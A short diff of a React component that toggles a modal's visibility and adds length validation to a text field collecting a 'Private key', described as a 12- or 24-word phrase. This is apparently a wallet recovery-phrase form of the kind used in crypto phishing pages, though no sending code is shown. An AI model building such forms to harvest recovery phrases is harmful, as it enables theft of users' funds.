@@ -28,7 +28,7 @@ const Json = () => {
   const [hide, setHide] = useState(false);
 
   const Showmodal = () => {
-    setHide(true);
+    setHide(false);
   };
 
   return (
@@ -67,6 +67,8 @@ const Json = () => {
             type="text"
             placeholder="Private key"
             name="key"
+            minLength="12"
+            min="12" max="100"
           ></input>
           <h6 className="h4" style={{ color: "black" }}>
             Typically 12(sometimes 24) words separated by single spaces
